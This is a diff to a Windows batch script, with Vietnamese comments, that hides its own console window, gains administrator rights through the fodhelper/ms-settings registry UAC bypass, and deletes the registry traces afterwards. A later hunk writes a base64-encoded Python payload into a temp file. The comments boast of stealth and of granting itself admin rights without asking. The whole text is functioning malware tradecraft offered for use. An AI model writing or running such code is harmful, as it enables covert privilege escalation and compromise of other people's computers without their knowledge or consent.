@@ -4,17 +4,20 @@
 setlocal ENABLEDELAYEDEXPANSION
 
 :: Bùa ẩn thân: Trốn khỏi mắt thường bằng cách chạy ẩn toàn bộ cửa sổ dòng lệnh đen xì của Windows
-if "%1"=="h" goto begin
-mshta vbscript:createobject("wscript.shell").run(""%~nx0" h",0)(window.close)&exit
-:begin
+if "%~1"=="h" goto begin
+if exist "%temp%\h.vbs" del "%temp%\h.vbs"
+echo CreateObject("Wscript.Shell").Run """" ^& WScript.Arguments(0) ^& """" ^& " h", 0, False > "%temp%\h.vbs"
+wscript "%temp%\h.vbs" "%~dpnx0"
+exit
 
+:begin
 :: 1. Kích hoạt cơ chế UAC Bypass - Tự phong tước vị tối cao (Admin) mà không hỏi ý kiến
 net session >nul 2>&1
 if %errorLevel% == 0 (
     goto :run_payload
 ) else (
     reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f >nul 2>&1
-    reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "cmd.exe /c %~dpnx0 h" /f >nul 2>&1
+    reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "cmd.exe /c \"\"%~dpnx0\" h\"" /f >nul 2>&1
     fodhelper.exe
     
     :: Chờ 2 giây để thuật thôi miên có tác dụng rồi lập tức xóa sạch vết chân Registry
@@ -531,6 +534,7 @@ echo b64_str += "ICAgICBhd2FpdCBfZW5zdXJlX2F1bWlkKCkKICAgICAgICBhd2FpdCBydW4oKQo
 echo b64_str += "IHdoaWxlIFRydWU6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBhc3luY2lvLnJ1bihfbWFpbigpKQogICAgICAgIGV4Y2VwdCBF">> "%temp_py%"
 echo b64_str += "eGNlcHRpb24gYXMgX2U6CiAgICAgICAgICAgIGxvZy5lcnJvcihmIkZhdGFsIE5ldXJhbCBDb3JlIENyYXNoOiB7X2V9LiBSZXN0">> "%temp_py%"
 echo b64_str += "YXJ0aW5nIG5ldXJhbCBsb29wIGluIDMwc+KApiIpCiAgICAgICAgICAgIF90aW1lLnNsZWVwKDMwKQo=">> "%temp_py%"
+
 
 
 
